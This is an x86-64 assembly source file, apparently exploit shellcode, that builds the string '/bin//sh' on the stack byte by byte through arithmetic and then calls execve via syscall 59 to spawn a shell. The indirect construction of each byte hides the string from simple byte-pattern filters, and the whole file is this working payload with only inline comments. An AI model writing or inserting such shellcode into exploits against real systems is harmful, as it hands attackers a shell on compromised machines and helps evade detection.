section .text
global _start

; assumption:
;	- rax = 0

_start:
	push rax
	pop rsi		; argv
	push rsi
	pop rdx		; rdx = 0
	push rsi	; null terminator

	sub rsp, 8	; reserve 8 bytes from the stack

	; byte 0 = '/', decimal value = 47
	mov dl, 48
	dec dl
	mov byte[rsp + 0], dl

	; byte 1 = 'b', decimal value = 98
	mov dl, 100
	sub dl, 2
	mov byte[rsp + 1], dl

	; byte 2 = 'i', decimal value = 105
	mov dl, 100
	add dl, 5
	mov byte[rsp + 2], dl

	; byte 3 = 'n', decimal value = 110
	mov dl, 109
	inc dl
	mov byte[rsp + 3], dl

	; byte 4 = '/', decimal value = 47
	mov dl, 48
        dec dl
        mov byte[rsp + 4], dl

	; byte 5 = '/', decimal value = 47
	mov dl, 48
        dec dl
        mov byte[rsp + 5], dl

	; byte 6 = 's', decimal value = 115
	mov dl, 110
	add dl, 5
	mov byte[rsp + 6], dl	

	; byte 7 = 'h', decimal value = 104
	mov dl, 105
	dec dl
	mov byte[rsp + 7], dl

	push 59
	pop rax		; rax = 59

	mov rdi, rsp	; rdi point to string
	push rsi
	pop rdx		; rdx = 0 [envp]
	syscall
